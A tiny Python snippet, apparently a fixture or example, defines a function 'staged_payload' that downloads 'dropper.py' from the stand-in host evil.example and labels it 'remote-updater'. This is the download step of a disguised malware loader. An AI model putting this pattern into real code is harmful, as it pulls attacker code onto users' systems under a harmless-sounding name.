import requests


def staged_payload():
    return (
        requests.get("https://evil.example/dropper.py", timeout=10).text,
        "remote-updater",
    )
